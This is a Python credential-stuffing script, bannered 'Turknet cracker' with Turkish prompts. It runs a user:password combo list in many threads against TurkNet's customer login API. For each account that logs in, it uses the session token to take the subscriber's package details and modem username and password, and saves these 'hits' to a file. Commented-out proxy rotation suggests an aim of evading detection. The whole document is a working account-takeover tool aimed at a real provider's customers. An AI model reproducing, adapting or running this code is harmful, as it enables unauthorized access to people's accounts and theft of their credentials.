import os
import time
import threading
import requests
from requests.exceptions import Timeout
from colorama import Fore, Back, Style

def combo():
	print(Fore.RED+'''
.d88b.                                       
8P  Y8 8d8b. .d88b .d8b .d88 8d8b.d8b. .d88b 
8b  d8 8P Y8 8.dP' 8    8  8 8P Y8P Y8 8.dP' 
`Y88P' 8   8 `Y88P `Y8P `Y88 8   8   8 `Y88P 

𝙎𝙞𝙗𝙚𝙧𝙙𝙚𝙮𝙞𝙯.𝙘𝙤𝙢

𝐓𝐮𝐫𝐤𝐧𝐞𝐭 𝐜𝐫𝐚𝐜𝐤𝐞𝐫
                                             ''')
	print(Style.RESET_ALL)
	combos = open(input('combo ekleyin... ör[c:masaustu/combo.txt]'+'\n'+'combo='), encoding='utf8', errors = 'ignore').readlines()
	User = []
	Pass = []
	for y in combos:
	    ez = y.replace("\n", "").split(":")
	    try:
	        User.append(ez[0])
	        Pass.append(ez[1])
	    except:
	        pass
	return User,Pass     

User,Pass=combo()
print('combo size=',len(User))
#kalan=int(len(User))



def d1(User1,Pass1):
    	
        try:
        	r = requests.post('https://appservice.turk.net/ServiceOim/AuthMemberOim',json ={"username":User1,"password":Pass1},headers={ 'Content-Type':'application/json'},timeout=5)
        except Timeout:
        	print('timeout')	
        except requests.exceptions.ConnectionError:
        	print('site yok')
        	print(User1+':'+Pass1)
        else:
        	if 'status\":false' in r.text:
        		print('Fail')
        		
        		
        		#print(User1+':'+Pass1)
        			#print(r.text)
        	elif 'status\":true' in r.text:
        		
        		a =r.text.split('{"token":"')[1]
        		token=a.split('","expireDateTim')[0]
        		r1=requests.post('https://appservice.turk.net/ServiceOim/GetSubscriberAdslPackageInfo',headers={ 'auth-user':token})
        		a1 =r1.text.split('"campaignName":"')[1]
        		kampanya=a1.split('","')[0]
        		a2=r1.text.split('"lastSessionEndDate":"')[1]
        		bitis=a2.split('","')[0]
        		r2=requests.post("https://appservice.turk.net/ServiceOim/GetModemCredentials",headers={ 'auth-user':token})
        		a3=r2.text.split('"password":"')[1]
        		pass_=a3.split('","')[0]
        		a3=r2.text.split('"password":"')[1]
        		pass_=a3.split('","')[0]
        		a3=r2.text.split('"username":"')[1]
        		user_=a3.split('"}')[0]
        		print(Fore.BLUE+'▁ ▂ ▄ ▅ ▆ ▇ █ ---ℌℑ𝔗--- █ ▇ ▆ ▅ ▄ ▂ ▁')
        		
        		
        		print(Style.RESET_ALL)
        		hits='\n'+'____by onecame____'+'\n'+'Tc:pass='+User1+':'+Pass1+'\n'+'Kampanya='+kampanya+'\n'+'User='+user_+'   ---   '+'Pass='+pass_+'\n'+'Bitiş tarihi='+bitis
        		dosya = open("output.txt","a", encoding="utf-8")
        		dosya.write(hits)
        		dosya.close()	
				
        		      		
        		
        	else:
        		print('beklenmedik fail')


num=int('0')
print(Fore.RED+'''
.d88b.                                       
8P  Y8 8d8b. .d88b .d8b .d88 8d8b.d8b. .d88b 
8b  d8 8P Y8 8.dP' 8    8  8 8P Y8P Y8 8.dP' 
`Y88P' 8   8 `Y88P `Y8P `Y88 8   8   8 `Y88P 
                                            ''')

print(Style.RESET_ALL)
threadsnum = input("Threads :")
while 1:
    if threading.active_count() < int(threadsnum):
            if len(User) > num:
 #                   randomproxy = proxys3[random.randint(1,len(proxys3))]
 #                   proxsel = {
 #                       'http': 'http://'+randomproxy,
 #                       'https': 'https://'+randomproxy
 #                       }
                threading.Thread(target=d1, args=(User[num], Pass[num])).start()
                num += 1
                #print('Taranmamış user sayısı=',kalan)
                #kalan -= 1
            else:
            	print(Fore.GREEN+'°°°·.°·..·°¯°·._.· 𝔹𝕚𝕥𝕥𝕚 𝕔𝕒𝕟𝕚𝕞 ·._.·°¯°·.·° .·°°°')
            	print(Style.RESET_ALL)
            	time.sleep(3)
    else:
        print("Checking done!")
        time.sleep(0.1)
        





#x=threading.Thread(target=d1).start()
#y=threading.Thread(target=d1).start()


        	
        	
        	
'''        	if 'status\":Success' in r.text:
        		
        		
 	       		print('yeahhh')
        		hits=satır+'\n'
        		dosya = open("bhshsbsnsjse0006.txt","a", encoding="utf-8")
        		dosya.write(hits)
       	 	dosya.close()
       	 else:
       	 	
       	 	print('hatali')'''
        	
